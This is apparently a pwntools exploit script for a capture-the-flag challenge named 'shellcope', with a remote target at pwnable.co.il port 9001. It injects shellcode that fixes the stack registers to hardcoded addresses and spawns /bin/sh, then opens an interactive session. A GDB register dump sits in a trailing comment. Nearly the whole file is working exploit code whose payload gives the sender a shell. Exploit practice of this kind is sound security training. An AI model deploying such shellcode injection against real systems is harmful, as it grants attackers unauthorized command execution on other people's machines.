from pwn import * 

elf = ELF('./shellcope')
context.log_level = 'DEBUG'
libc = elf.libc 
context.arch = 'x86_64'

if args['REMOTE']: 
    p = remote('pwnable.co.il', 9001)
else: 
    p = process([elf.path])
    gdb.attach(p, 'b main')   
    pause()


payload = (
    asm('mov rsp, 0x7ffda375eb90') + 
    asm('mov rbp, 0x7ffda375eba0') + 
    asm(shellcraft.linux.sh())
)



p.sendline(payload)
p.interactive()

'''
rax            0x0                 0x0
rbx            0x7ffda375ecb8      0x7ffda375ecb8
rcx            0x7f4dcbed00f7      0x7f4dcbed00f7
rdx            0x5                 0x5
rsi            0x1000              0x1000
rdi            0x7f4dcbfbd000      0x7f4dcbfbd000
rbp            0x7ffda375eba0      0x7ffda375eba0
rsp            0x7ffda375eb90      0x7ffda375eb90
r8             0x560128efb2cd      0x560128efb2cd
r9             0x0                 0x0
r10            0x1000              0x1000
r11            0x202               0x202
r12            0x0                 0x0
r13            0x7ffda375ecc8      0x7ffda375ecc8
r14            0x0                 0x0
r15            0x7f4dcbff2000      0x7f4dcbff2000
rip            0x560127dd1226      0x560127dd1226 <main+125>
eflags         0x217               [ CF PF AF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0

'''       



